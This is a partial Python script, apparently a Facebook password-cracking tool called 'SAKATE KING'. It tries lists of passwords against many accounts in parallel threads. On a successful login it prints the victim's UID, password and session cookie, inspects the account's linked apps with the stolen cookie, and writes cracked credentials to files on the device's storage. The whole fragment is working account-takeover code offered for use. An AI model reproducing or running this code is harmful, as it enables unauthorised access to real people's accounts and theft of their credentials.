...
AUTHOR    : SAKATE KING
FACEBOOK : Krimo sk & akira ashiro
VERSION    : 69.
                                   [SAKATE KING USER]
____________________"""
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r {GREEN}[SAKATE] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
...
def Random():
    ...
    with ThreadPool(max_workers=30) as yaari:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL ACCOUNT              : {RED}"+tl)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\r\033[1;32m[SAKATE]---------------------[SAKATE-USER-OK]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')
                cek_apk(session,coki)
                open('/sdcard/Sakate-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[141:156]
                Red = '\033[1;31m'
                print(f'\r{Red}[SAKATE—]--------------------[SAKATE-USER-CP]---------------------[Ã—]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\n[SAKATE—]---------------------------------------------------[Ã—]\033[1;97m')
                open('/sdcard/Sakate-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[SAKATE] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
